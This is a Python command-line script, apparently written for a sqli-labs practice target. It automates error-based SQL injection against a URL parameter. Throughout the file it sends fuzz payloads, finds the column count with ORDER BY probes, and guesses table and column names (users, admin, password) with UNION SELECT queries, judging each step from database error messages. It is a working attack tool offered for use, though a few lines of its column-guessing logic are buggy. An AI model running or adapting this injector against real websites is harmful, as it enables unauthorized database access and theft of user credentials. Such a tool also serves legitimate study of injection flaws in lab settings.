#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
__file__    : sql_injector.py
__time__    : 2020/6/17 21:12
__author__  : crisimple
__github__ :  https://crisimple.github.io/
__desc: 执行参数
python sql_injector.py -u http://129.28.170.125:8001/Less-1/?id=sql_fuzz -i sql_fuzz
"""
import optparse
import requests

# 初始化对象
parse = optparse.OptionParser()

# 初始化对象的 usage 属性
parse.usage = "sql_injector.py -u url -i inject_fuzz"

# 添加参数
parse.add_option(
    "-u", "--url", dest="url", help="url to test sql", action="store", type="string", metavar="URL"
)
parse.add_option(
    "-i", "--inject", dest="inject_fuzz", help="inject sql file", action="store", type="string", metavar="FUZZFILE"
)

# 存储提交的命令行参数
(options, args) = parse.parse_args()

# 测试输出
origin_url = options.url
sql_fuzz = options.inject_fuzz
# print("url: ", origin_url)
# print("sql_fuzz: ", sql_fuzz)

def get_urls():
    urls = []
    with open("sql_fuzz.txt", "r") as f:
        payload_list = f.readlines()
        for payload in payload_list:
            payload = payload.strip()

            temp_url = origin_url
            urls.append(temp_url.replace("sql_fuzz", payload))
    return urls

# inject_urls = get_urls()
# for item in inject_urls:
#     print(item)

"""
    根据常见的注入点字典
    遍历URL结合常见的注入点字典，判断哪些情况存在SQL注入
"""
sql_inject_url = []
def test_sql_inject():
    inject_urls = get_urls()
    print("*"*20)
    print("Start get url: ")
    for inject_url in inject_urls:
        r = requests.get(
            url=inject_url
        )
        print(r.url)
        result = r.text
        if result.find("SQL syntax") != -1:
            sql_inject_url.append(r.url)

    if len(sql_inject_url) == 0:
        print("no sql inject")
    else:
        print("\n" + "*"*10 + "Exists sql inject url: " + "*"*10)
        for item in sql_inject_url:
            print(item)

"""
    URL：http://129.28.170.125:8001/Less-1/?id=%27+order+by+3+--+
    探测当前表的列（字段）数 order by 4 -- 
    出现 [Unknown column '0' in 'order clause'] 关键字，表示字段不存在，那个字段数为 4 - 1 个字段数  
"""
def detect_columns_num():
    print("\n" + "*"*10 + "This table has many columns: " + "*"*10)
    i = 0
    while i < 100:
        i += 1
        temp_url = origin_url.replace("sql_fuzz", "1'+order+by+" + str(i) + "+--+")
        r = requests.get(temp_url)
        print(r.url)
        result = r.text
        if result.find("Unknown") == -1:
            continue
        else:
            # print("Find this table has %s columns" % (i-1))
            break
    return i - 1

"""
    URL：http://129.28.170.125:8001/Less-1/?id=-1'+union+select+1,2,3+from+aaa+--+
    探测所使用的表名 ​-1'+union+select+1,2,3+from+aaa+--+
    出现 [Table 'security.aaa' doesn't exist] 关键字，表示字段不存在，那个字段数为 4 - 1 个字段数  
"""
def detect_table_name():
    print("\n" + "*"*10 + "Detect table name: " + "*"*10)
    table_result = []
    dcn = detect_columns_num()
    cols = ""
    for i in range(dcn):
        cols = cols + str(i+1) + ","
    cols = cols[0: len(cols)-1]
    # print(cols)
    table_error_key = "doesn't exist"

    # 这里可以用读取文件字典的形式读取预测的表名
    table_name_list = [
        "users", "admin", "root", "administrator", "email", "class"
    ]
    for table_name in table_name_list:
        temp_url = origin_url.replace("sql_fuzz", "-1'+union+select+" + cols + "+from+" + table_name + "+--+")
        r = requests.get(url=temp_url)
        result = r.text
        if result.find(table_error_key) == -1:
            # 没有找到这个错误
            table_result.append(table_name)
    # print(table_result)
    return table_result

"""
    URL：http://129.28.170.125:8001/Less-1/?id=-1'+union+select+1,2,3+from+表名+--+
    探测所使用的表名 
        ​-1'+union+select+1,2,3+from+表名+--+
        ​1,2,3替换为对应的列名
    出现 [Unknown column 'aaa' in 'field list'] 关键字，表示字段不存在，那个字段数为 4 - 1 个字段数  
"""
def detect_column_name():
    print("\n" + "*"*10 + "Detect table and Find table columns: " + "*"*10)
    # 存放没有找到错误结果的列，说明这些列是存在的所以不会报错
    column_result = []
    column_error_key = "Unknown column '"
    print("\n" + "*"*10 + "Detect table's columns: " + "*"*10)
    dcn = detect_columns_num()
    cols = ""
    for i in range(dcn):
        cols = cols + str(i+1) + ","
    cols = cols[0: len(cols)-1]

    # 这里可以用读取文件字典的形式读取预测的字段名
    column_name_list = [
        "id", "user", "admin", "password", "users", "score"
    ]

    # table_name_list = [
    #     "users", "admin", "root", "administrator", "email", "class1"
    # ]

    # 调用探测表名函数，获取存在的表名有，循环遍历存在的表，进行每个表的字段名探测
    table_result = detect_table_name()
    for table_name in table_result:
        for column_name in column_name_list:
            temp_url = origin_url.replace("sql_fuzz", "-1'+union+select+" + column_name.replace('1', column_name) + ",2,3+from+" + table_name + "+--+")
            r = requests.get(url=temp_url)
            print(r.url)
            result = r.text
            if result.find(column_error_key) == -1:
                # 没有找到这个错误，说明这个字段是存在的
                column_result.append(column_name)
        else:
            column_result.append(table_name)
    # print("=======", column_result)
    # return column_result
    print("\n 当前表存在的字段有：")
    print("type of column_result: ", type(column_result))
    print("type of column_result: ", column_result)
    for line in column_result:
        if line not in table_result:
            print(line)
        else:
            print("上边的内容就是改表对应的字段名：" + line)

if __name__ == "__main__":
    # test_sql_inject()
    # detect_columns_num()
    # table_result = detect_table_name()
    # print("table_result: ", table_result)
    detect_column_name()

